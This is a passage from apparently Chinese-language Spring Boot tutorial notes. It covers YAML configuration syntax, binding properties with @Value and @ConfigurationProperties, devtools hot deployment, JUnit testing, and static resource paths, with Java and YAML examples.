<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">student</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>sangeng<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>15<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="5-1-2YML优点"><a href="#5-1-2YML优点" class="headerlink" title="5.1.2YML优点"></a>5.1.2YML优点</h4><ol>
<li><p>YAML易于人们阅读。</p>
</li>
<li><p>更加简洁明了</p>
</li>
</ol>
<h3 id="5-2-语法"><a href="#5-2-语法" class="headerlink" title="5.2.语法"></a>5.2.语法</h3><h4 id="5-2-1约定"><a href="#5-2-1约定" class="headerlink" title="5.2.1约定"></a>5.2.1约定</h4><ul>
<li><p>k: v 表示键值对关系，<strong>冒号后面必须有一个空格</strong></p>
</li>
<li><p>使用空格的缩进表示层级关系，空格数目不重要，<strong>只要是左对齐的一列数据，都是同一个层级的</strong></p>
</li>
<li><p>大小写敏感</p>
</li>
<li><p>缩进时<strong>不允许使用Tab键，只允许使用空格</strong>。(IDEA会帮忙替换tab为空格)</p>
</li>
<li><p><label style="background:yellow">java中对于驼峰命名法，可用原名或使用-代替驼峰，如java中的lastName属性,在yml中使用lastName或 last-name都可正确映射。</label></p>
</li>
<li><p>yml中注释前面要加#</p>
</li>
</ul>
<h4 id="5-2-2键值关系"><a href="#5-2-2键值关系" class="headerlink" title="5.2.2键值关系"></a>5.2.2键值关系</h4><h5 id="普通值-字面量"><a href="#普通值-字面量" class="headerlink" title="普通值(字面量)"></a>普通值(字面量)</h5><p>k: v：字面量直接写；</p>
<p>   字符串默认不用加上单引号或者双绰号；</p>
<p>   “”: 双引号；转义字符能够起作用</p>
<p>​       name:   “sangeng \n caotang”：输出；sangeng 换行  caotang</p>
<p>   ‘’：单引号；会转义特殊字符，特殊字符最终只是一个普通的字符串数据</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name1:</span> <span class="string">sangeng</span> </span><br><span class="line"><span class="attr">name2:</span> <span class="string">&#x27;sangeng  \n caotang&#x27;</span></span><br><span class="line"><span class="attr">name3:</span> <span class="string">&quot;sangeng  \n caotang&quot;</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">15</span></span><br><span class="line"><span class="attr">flag:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h5 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h5><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">date:</span> <span class="number">2019</span><span class="string">/01/01</span></span><br></pre></td></tr></table></figure>



<h5 id="对象-属性和值-、Map-键值对"><a href="#对象-属性和值-、Map-键值对" class="headerlink" title="对象(属性和值)、Map(键值对)"></a>对象(属性和值)、Map(键值对)</h5><p>多行写法：</p>
<p>在下一行来写对象的属性和值的关系，注意缩进 </p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">zhangsan</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>行内写法：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span> &#123;<span class="attr">name:</span> <span class="string">zhangsan</span>,<span class="attr">age:</span> <span class="number">20</span>&#125;</span><br></pre></td></tr></table></figure>

<h5 id="数组、list、set"><a href="#数组、list、set" class="headerlink" title="数组、list、set"></a>数组、list、set</h5><p> 用- 值表示数组中的一个元素 </p>
<p>多行写法：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pets:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pig</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cat</span></span><br></pre></td></tr></table></figure>



<p>行内写法：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pets:</span> [<span class="string">dog</span>,<span class="string">pig</span>,<span class="string">cat</span>]</span><br></pre></td></tr></table></figure>



<h5 id="对象数组、对象list、对象set"><a href="#对象数组、对象list、对象set" class="headerlink" title="对象数组、对象list、对象set"></a>对象数组、对象list、对象set</h5><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">students:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">zhangsan</span></span><br><span class="line">   <span class="attr">age:</span> <span class="number">22</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lisi</span></span><br><span class="line">   <span class="attr">age:</span> <span class="number">20</span></span><br><span class="line"> <span class="bullet">-</span> &#123;<span class="attr">name:</span> <span class="string">wangwu</span>,<span class="attr">age:</span> <span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure>



<h4 id="5-2-3-占位符赋值"><a href="#5-2-3-占位符赋值" class="headerlink" title="5.2.3 占位符赋值"></a>5.2.3 占位符赋值</h4><p>可以使用 <strong>${key:defaultValue}</strong> 的方式来赋值，若key不存在，则会使用defaultValue来赋值。</p>
<p>例如</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="string">$&#123;myPort:8080&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">myPort:</span> <span class="number">80</span>   </span><br></pre></td></tr></table></figure>

<h3 id="5-3-SpringBoot读取YML"><a href="#5-3-SpringBoot读取YML" class="headerlink" title="5.3.SpringBoot读取YML"></a>5.3.SpringBoot读取YML</h3><h4 id="5-3-1-Value注解"><a href="#5-3-1-Value注解" class="headerlink" title="5.3.1 @Value注解"></a>5.3.1 @Value注解</h4><p>​    注意使用此注解只能获取简单类型的值（8种基本数据类型及其包装类，String,Date）</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">lastName:</span> <span class="string">sangeng</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;student.lastName&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(lastName);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：加了@Value的类必须是交由Spring容器管理的</strong></p>
<h4 id="5-3-2-ConfigurationProperties"><a href="#5-3-2-ConfigurationProperties" class="headerlink" title="5.3.2 @ConfigurationProperties"></a>5.3.2 @ConfigurationProperties</h4><p>​    yml配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">lastName:</span> <span class="string">sangeng</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">17</span></span><br><span class="line"><span class="attr">student2:</span></span><br><span class="line">  <span class="attr">lastName:</span> <span class="string">sangeng2</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>​    在类上添加注解@Component  和@ConfigurationProperties(prefix = “配置前缀”)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;student&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    从spring容器中获取Student对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Student student;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(student);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    <strong>注意事项：要求对应的属性要有set/get方法，并且key要和成员变量名一致才可以对应的上。</strong></p>
<h5 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h5><p>今天SpringBoot配置文件部署时,发出警告<code>Spring Boot Configuration Annotation Processor not configured</code>但是不影响运行</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220201205503274.png" alt="image-20220201205503274"></p>
<p>解决方法</p>
<p>在maven中引入依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置注解执行器配置完成后，当执行类中已经定义了对象和该对象的字段后，在配置文件中对该类赋值时，便会非常方便的弹出提示信息。    <strong>注意：添加完依赖加完注解后要运行一次程序才会有相应的提示。</strong></p>
<h3 id="5-4-练习"><a href="#5-4-练习" class="headerlink" title="5.4.练习"></a>5.4.练习</h3><p>要求把下面实体类中的各个属性在yml文件中进行赋值。然后想办法读取yml配置的属性值，进行输出测试。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; maps2;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Dog&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String[] arr;</span><br><span class="line">    <span class="keyword">private</span> String[] arr2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Dog&gt; dogMap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 练习</span></span><br><span class="line"><span class="attr">student:</span></span><br><span class="line">  <span class="attr">lastName:</span> <span class="string">sangeng</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">15</span></span><br><span class="line">  <span class="attr">boss:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">birthday:</span> <span class="number">2006</span><span class="string">/2/3</span></span><br><span class="line">  <span class="attr">maps:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sangeng</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">11</span></span><br><span class="line">  <span class="attr">maps2:</span> &#123;<span class="attr">name:</span> <span class="string">caotang</span>,<span class="attr">age:</span> <span class="number">199</span>&#125;</span><br><span class="line">  <span class="attr">list:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">小白</span></span><br><span class="line">      <span class="attr">age:</span> <span class="number">3</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">小黄</span></span><br><span class="line">      <span class="attr">age:</span> <span class="number">4</span></span><br><span class="line">    <span class="bullet">-</span> &#123;<span class="attr">name:</span> <span class="string">小黑</span>,<span class="attr">age:</span> <span class="number">1</span>&#125;</span><br><span class="line">  <span class="attr">dog:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">小红</span></span><br><span class="line">    <span class="attr">age:</span> <span class="number">5</span></span><br><span class="line">  <span class="attr">arr:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">sangeng</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">caotang</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">arr2:</span> [<span class="string">sangeng</span>,<span class="string">caotang</span>]</span><br><span class="line">  <span class="attr">dogMap:</span></span><br><span class="line">    <span class="attr">xb:</span> &#123;<span class="attr">name:</span> <span class="string">小白</span>,<span class="attr">age:</span> <span class="number">9</span>&#125;</span><br><span class="line">    <span class="attr">xh:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">小红</span></span><br><span class="line">      <span class="attr">age:</span> <span class="number">6</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;student&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String lastName;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; maps;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; maps2;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Dog&gt; list;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String[] arr;</span><br><span class="line">    <span class="keyword">private</span> String[] arr2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,Dog&gt; dogMap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-5-YML和properties配置的相互转换"><a href="#5-5-YML和properties配置的相互转换" class="headerlink" title="5.5 YML和properties配置的相互转换"></a>5.5 YML和properties配置的相互转换</h3><p>​    我们可以使用一些网站非常方便的实现YML和properties格式配置的相互转换。</p>
<p>转换网站：<a href="https://www.toyaml.com/index.html">https://www.toyaml.com/index.html</a></p>
<h1 id="SpringBoot-常见场景"><a href="#SpringBoot-常见场景" class="headerlink" title="SpringBoot-常见场景"></a>SpringBoot-常见场景</h1><h2 id="1-热部署"><a href="#1-热部署" class="headerlink" title="1.热部署"></a>1.热部署</h2><p>​    SpringBoot为我们提供了一个方便我们开发测试的工具dev-tools。使用后可以实现热部署的效果。当我们运行了程序后对程序进行了修改，程序会自动重启。</p>
<p>​     原理是使用了两个ClassLoder,一个ClassLoader加载哪些不会改变的类(第三方jar包),另一个ClassLoader加载会更改的类.称之为Restart ClassLoader,这样在有代码更改的时候,原来的Restart Classloader被丢弃,重新创建一个Restart ClassLoader,由于需要加载的类相比较少,所以实现了较快的重启。</p>
<p>​    </p>
<h3 id="1-1-准备工作"><a href="#1-1-准备工作" class="headerlink" title="1.1 准备工作"></a>1.1 准备工作</h3><p>①设置IDEA自动编译</p>
<p>​     在idea中的setting做下面配置 </p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91%E9%85%8D%E7%BD%AE.png" alt="自动编译配置"></p>
<p>②设置允许程序运行时自动启动</p>
<p>​     ctrl + shift + alt + / 这组快捷键后会有一个小弹窗，点击Registry 就会进入下面的界面，找到下面的配置项并勾选，勾选后直接点close </p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/%E5%85%81%E8%AE%B8%E8%BF%90%E8%A1%8C%E6%97%B6%E8%87%AA%E5%8A%A8%E5%90%AF%E5%8A%A8.png" alt="允许运行时自动启动"></p>
<h3 id="1-2使用"><a href="#1-2使用" class="headerlink" title="1.2使用"></a>1.2使用</h3><p>①添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>②触发热部署</p>
<p>​    当我们在修改完代码或者静态资源后可以切换到其它软件，让IDEA自动进行编译，自动编译后就会触发热部署。</p>
<p>​    或者使用Ctrl+F9手动触发重新编译。</p>
<h2 id="2-单元测试"><a href="#2-单元测试" class="headerlink" title="2.单元测试"></a>2.单元测试</h2><p>​    我们可以使用SpringBoot整合Junit进行单元测试。</p>
<p>​    <strong>Spring Boot 2.2.0 版本开始引入 JUnit 5 作为单元测试默认库</strong>。</p>
<p>​    Junit5功能相比于Junit4也会更强大。但是本课程是SpringBoot的课程，所以主要针对SpringBoot如何整合Junit进行单元测试做讲解。暂不针对Junit5的新功能做介绍。如有需要会针对Junit5录制专门的课程进行讲解。</p>
<p>​    </p>
<h3 id="2-1-使用"><a href="#2-1-使用" class="headerlink" title="2.1 使用"></a>2.1 使用</h3><h4 id="①添加依赖"><a href="#①添加依赖" class="headerlink" title="①添加依赖"></a>①添加依赖</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="②编写测试类"><a href="#②编写测试类" class="headerlink" title="②编写测试类"></a>②编写测试类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HelloController helloController;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testJunit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">        System.out.println(helloController);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>注意：测试类所在的包需要和启动类是在同一个包下。否则就要使用如下写法指定启动类。</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="comment">//classes属性来指定启动类</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = HelloApplication.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HelloController helloController;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testJunit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">        System.out.println(helloController);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="2-2-兼容老版本"><a href="#2-2-兼容老版本" class="headerlink" title="2.2 兼容老版本"></a>2.2 兼容老版本</h3><p>​    如果是对老项目中的SpringBoot进行了版本升级会发现之前的单元测试代码出现了一些问题。</p>
<p>​    因为Junit5和之前的Junit4有比较大的不同。</p>
<p>​    先看一张图：</p>
<p> <img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/junit5.jpeg" alt="img"> </p>
<p>​    从上图可以看出  <strong>JUnit 5 = JUnit Platform + JUnit Jupiter + JUnit Vintage</strong></p>
<ul>
<li><strong>JUnit Platform</strong>： 这是Junit提供的平台功能模块，通过它，其它的测试引擎也可以接入</li>
<li><strong>JUnit JUpiter</strong>：这是JUnit5的核心，是一个基于JUnit Platform的引擎实现，它包含许多丰富的新特性来使得自动化测试更加方便和强大。</li>
<li><strong>JUnit Vintage</strong>：这个模块是兼容JUnit3、JUnit4版本的测试引擎，使得旧版本的自动化测试也可以在JUnit5下正常运行。</li>
</ul>
<p>​    虽然Junit5包含了<strong>JUnit Vintage</strong>来兼容JUnit3和Junit4，但是<strong>SpringBoot 2.4 以上版本对应的spring-boot-starter-test移除了默认对</strong> <strong>Vintage 的依赖。</strong>所以当我们仅仅依赖spring-boot-starter-test时会发现之前我们使用的@Test注解和@RunWith注解都不能使用了。</p>
<p>​    我们可以单独在依赖vintage来进行兼容。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>注意：</strong></p>
<p>​        <strong>org.junit.Test对应的是Junit4的版本，就搭配@RunWith注解来使用。</strong></p>
<p>SpringBoot2.2.0之前版本的写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sangeng.controller.HelloController;</span><br><span class="line"><span class="comment">//import org.junit.jupiter.api.Test;</span></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"></span><br><span class="line"><span class="comment">//classes属性来指定启动类</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ApplicationTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HelloController helloController;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testJunit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">        System.out.println(helloController);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-Web开发"><a href="#4-Web开发" class="headerlink" title="4.Web开发"></a>4.Web开发</h2><h3 id="4-1-静态资源访问"><a href="#4-1-静态资源访问" class="headerlink" title="4.1 静态资源访问"></a>4.1 静态资源访问</h3><p>​    由于SpringBoot的项目是打成jar包的所以没有之前web项目的那些web资源目录(webapps)。</p>
<p>​    那么我们的静态资源要放到哪里呢？</p>
<p>​    从SpringBoot官方文档中我们可以知道，我们可以把静态资源放到 <code>resources/static</code>   (或者 <code>resources/public</code> 或者<code>resources/resources</code> 或者 <code>resources/META-INF/resources</code>) 中即可。</p>
<p>​    静态资源放完后，</p>
<p>​    例如我们想访问文件：resources/static/index.html  只需要在访问时资源路径写成/index.html即可。  </p>
<p>​    例如我们想访问文件：resources/static/pages/login.html  访问的资源路径写成： /pages/login.html</p>
<h4 id="4-1-1-修改静态资源访问路径"><a href="#4-1-1-修改静态资源访问路径" class="headerlink" title="4.1.1 修改静态资源访问路径"></a>4.1.1 修改静态资源访问路径</h4><p>​    SpringBoot默认的静态资源路径匹配为/** 。如果想要修改可以通过 <code>spring.mvc.static-path-pattern</code> 这个配置进行修改。</p>
<p>​    例如想让访问静态资源的url必须前缀有/res。例如/res/index.html 才能访问到static目录中的。我们可以修改如下：</p>
<p>在application.yml中</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">mvc:</span></span><br><span class="line">    <span class="attr">static-path-pattern:</span> <span class="string">/res/**</span> <span class="comment">#修改静态资源访问路径</span></span><br></pre></td></tr></table></figure>



<h4 id="4-1-2-修改静态资源存放目录"><a href="#4-1-2-修改静态资源存放目录" class="headerlink" title="4.1.2 修改静态资源存放目录"></a>4.1.2 修改静态资源存放目录</h4><p>​    我们可以修改 spring.web.resources.static-locations 这个配置来修改静态资源的存放目录。</p>
<p>​    例如:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="attr">static-locations:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">classpath:/sgstatic/</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="string">classpath:/static/</span></span><br></pre></td></tr></table></figure>



<h3 id="4-2-设置请求映射规则-RequestMapping"><a href="#4-2-设置请求映射规则-RequestMapping" class="headerlink" title="4.2 设置请求映射规则@RequestMapping"></a>4.2 设置请求映射规则@RequestMapping</h3><p>​    详细讲解：<a href="https://www.bilibili.com/video/BV1AK4y1o74Y">https://www.bilibili.com/video/BV1AK4y1o74Y</a>  P5-P12</p>
<p>​    该注解可以加到方法上或者是类上。（查看其源码可知）</p>
<p>​    我们可以用其来设定所能匹配请求的要求。只有符合了设置的要求，请求才能被加了该注解的方法或类处理。</p>
